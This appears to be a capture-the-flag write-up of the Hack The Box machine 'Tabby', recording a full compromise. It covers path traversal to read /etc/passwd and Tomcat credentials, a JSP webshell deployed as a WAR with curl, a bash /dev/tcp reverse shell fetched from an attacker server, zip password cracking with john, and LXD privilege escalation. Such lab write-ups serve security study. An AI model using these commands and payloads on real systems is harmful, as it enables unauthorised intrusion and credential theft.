@@ -1,0 +1,231 @@
+We ran an nmap scan and we notice a couple of ports open:
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+We inspect and come to find out non of the pages redirect anywhere when following the links. So instead what we do is edit the /etc/hosts to have our ip address 
+resolve by using virtual routing by specifiying and hardcoding the hostname 
+of the machine.
+
+Once we get things resolved we find an interesting parameter in one of the urls:
+http://megahosting.htb/news.php?file=statement
+
+We are now going to use burp suite to see if we can get a file traversal to pull
+other files.
+
+Doing this on burp suite since you can not do path traversal on a web browser.
+and path traversal works.
+
+OUTPUT:
+GET /news.php?file=../../../../../etc/passwd HTTP/1.1
+Host: megahosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1GET /news.php?file=../../../../../etc/passwd HTTP/1.1
+Host: megahosting.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+RESPONSE:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+tomcat:x:997:997::/opt/tomcat:/bin/false
+mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
+ash:x:1000:1000:clive:/home/ash:/bin/bash
+
+END RESPONSE
+
+We come to find that the statement php file is one directory below the index.php
+file, we can find this out by doing a php filter. To grab source code of php page.
+
+Turns out that the news.php file from which the "statement" is being used is a file
+get contents.
+
+OUTPUT:
+GET /news.php?file=../news.php HTTP/1.1 
+
+
+<?php
+$file = $_GET['file'];
+$fh = fopen("files/$file","r");
+while ($line = fgets($fh)) {
+  echo($line);
+}
+fclose($fh);
+?>
+ 
+END OUTPUT
+
+
+This however means that we won't be able to execute code no matter what, but we 
+can still use this as a vector for more discovery.
+
+Bascially an LFI without a possibility of execution.We can try and check a users history as well as see if we can access a users authorized ssh keys which we should not have access to. 
+
+Next is to check out the other port that was om our nmap scan and try to see if 
+there is an alternative way to get in. Apparently there is, if we go to port 8080
+we discover a tomcat server running, with a default admin page.
+
+We can try and access the tomcat admin page by going to the following:
+http://10.10.10.194:8080/admin
+OR 
+http://10.10.10.194:8080/manager
+
+Once we hit the manager page we come to find it requesting our credentials.
+If you want to find a list of default tomcat usernames and password from the
+seclists you can go to the following file if seclists is already installed:
+/opt/SecLists/Passwords/Default-Credentials
+
+We can now in conjunction with the LFI can use it to read files to most likely find
+the creds for the tomcat server since we can read files. We use google to find
+tomcats xml file for users: location tomcat users.xml ubuntu
+
+One thing to notice while searching for tomcat config files is the version. The
+version on Tabby is version 9 so while searching make sure that we are looking
+for paths pertaining to version 9.
+
+After researching file paths we are able to find the path and get output back from
+burp by using the following:
+
+OUTPUT:
+GET /news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml HTTP/1.1
+
+  <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+
+END OUPUT
+
+The creds being tomcat:$3cureP4s5w0rd123!
+
+We however get a 403 access denied code since it is not running from within the local host browser, we can try and ajp which is tomcat proxy so that we can access. 
+
+However the port is closed, so instead we can hit the upload piece manually and 
+then do a put request. So we can go to:
+http://10.10.10.194:8080/manager/text/deploy
+
+The above is the endpoint in tomcat which you can interact on commandline and 
+deploy applications via WAR files that are used by JAVA. We need to deploy a war
+file so we be deploying a webshell.
+
+We go to tennc to get a bunch of webshells we can utilize. We choose the one called
+cmdjsp.jsp. We make sure to delete the portion that includes windows commandline
+shell information as this will interfere with exection of the script itself.
+
+We also change the form method from get to post as it makes it easier to manuver.  
+
+Once that is all done we now figure out a method to deploy the webshell, tomcat is
+application that can only read WAR file so have to make sure that the jsp file is
+converted into a WAR file, this can be done by using zip:
+	zip cmdjsp.war cmdjsp.jsp
+
+Now to deploy this file we will use curl as our intermediary to post our request:
+curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/app10
+
+
+We can now go directly to the tomcat web page and checkout out app to interact with it:
+http://10.10.10.194:8080/app10/cmdjsp.jsp
+
+After which we can now enter whatever commands we want. in this case we will want
+a reverse shell. So we will use burp to intercept the request and send a modified 
+request.
+
+Reverse shell fails to execute from the post request so the next best thing is to
+have the application curl a file by leveraging our recently created app and having
+it pull a script that has netcat reverse shell command. From our app once the bash
+script has been saved locally on disk we can have the app execute the bash script
+with reverse shell conmmands being ran from there locally as it seems there are 
+issues when sending from the post request.
+
+shell.sh Reverse shell bash script
+bash -i >& /dev/tcp/10.10.14.59/9001 0>&1
+
+python3 -m http.server 9000
+
+cmd=curl+-o+/dev/shm/shell.sh+http%3a//10.10.14.59%3a9000/shell.sh
+
+cmd=bash /dev/shm/shell.sh
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+stty raw -echo
+Now we have a reverse shell from which can continue to try and gain root. We want 
+to look for what applications are installed from where we currently are at.
+
+After snooping around in /var/www/html/files we come to find an interesting zip file:
+16162020_backup.zip
+
+We can transfer this file by base64ing the file and decoding it in our own host.
+
+Upon comppleteing the transfer and trying to unzip the file we notice that it is
+passsword protected. We can try and crack it ith zip2john to get a crackable hash. 
+
+Now that we have the has we can use john the ripper to crack it:
+john hash.zip --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+admin@it         (backup.zip)
+1g 0:00:00:00 DONE (2020-11-13 00:31) 1.063g/s 11019Kp/s 11019Kc/s 11019KC/s adnc153..adilizinha
+Use the "--show" option to display all of the cracked passwords reliably
+Session Complete
+
+The password being admin@it
+
+We look at the files but there doesn't appear to be anything of interest, instead
+what we will do is switch to the ash user and use the password that was used to
+open the zip file. We are now able to switch to the ash user.
+
+ash:admin@it
+
+Now we can run a privilege esclation script to see how to escalate our privileges.
+linpeas.sh
+
+We look at the yellow hilighted out put and come to find an lxc vulnerability off
+the bat.
+
+We google lxc privvesc hacktricks:
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+
+Now all that is needed is to follow all the instructions delineated on the web page
+and issuing the following command before the container is created:
+lxd init
+
+After that you should be able to navigate to /mnt/root/root to get the root.txt
+you may also get ssh private key of root and ssh as root to the box.
